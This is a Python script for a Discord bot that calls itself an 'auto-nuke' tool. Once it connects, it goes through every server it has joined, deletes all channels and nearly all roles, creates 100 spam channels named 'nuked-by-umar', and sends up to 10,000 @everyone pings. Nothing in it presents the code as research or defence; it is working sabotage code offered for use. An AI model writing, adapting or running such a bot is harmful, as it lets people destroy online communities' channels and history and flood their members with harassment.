import discord
import asyncio
import os

# ===== CONFIG =====
TOKEN = os.environ.get('TOKEN')
OWNER_ID = 361069640962801664

# Check if token exists
if not TOKEN:
    print("❌ ERROR: No token found!")
    print("   Set TOKEN environment variable in Railway:")
    print("   1. Go to Railway Dashboard")
    print("   2. Click Variables tab")
    print("   3. Add TOKEN = your_bot_token")
    exit(1)

# ===== CLIENT SETUP (NO COMMANDS) =====
intents = discord.Intents.all()
client = discord.Client(intents=intents)

# ===== AUTO NUKE - IMMEDIATE DESTRUCTION =====
@client.event
async def on_ready():
    print(f"🤖 BOT ONLINE: {client.user.name}")
    print(f"🔗 Connected to {len(client.guilds)} servers")
    print("💣 STARTING AUTO-NUKE ON ALL SERVERS...")
    
    # NUKE EVERY SERVER THE BOT IS IN
    for guild in client.guilds:
        print(f"\n🔥 NUKE INITIATED ON: {guild.name}")
        
        # STEP 1: DELETE ALL CHANNELS (FASTEST)
        print(f"   Deleting {len(guild.channels)} channels...")
        for channel in list(guild.channels):
            try:
                await channel.delete()
            except:
                pass
        
        # STEP 2: DELETE ALL ROLES (FASTEST)
        print(f"   Deleting roles...")
        for role in list(guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        
        # STEP 3: CREATE 100 CHANNELS + PING SPAM
        print(f"   Creating 100 spam channels...")
        channels = []
        
        for i in range(100):
            try:
                channel = await guild.create_text_channel("nuked-by-umar")
                channels.append(channel)
                await channel.send("@everyone NUKED BY UMAR")
            except:
                pass
        
        # STEP 4: MASS PING SPAM - ABSOLUTE MAX SPEED
        print(f"   Spamming pings...")
        ping_count = 0
        target = 10000
        
        while ping_count < target:
            for channel in channels:
                try:
                    await channel.send("@everyone NUKED BY UMAR")
                    ping_count += 1
                    if ping_count >= target:
                        break
                except:
                    pass
    
    print("\n💀 AUTO-NUKE COMPLETE - ALL SERVERS DESTROYED 💀")
    print("🛑 Bot will now disconnect...")
    await client.close()

# ===== RUN BOT =====
print("🚀 Starting Auto-Nuke Bot...")
client.run(TOKEN)
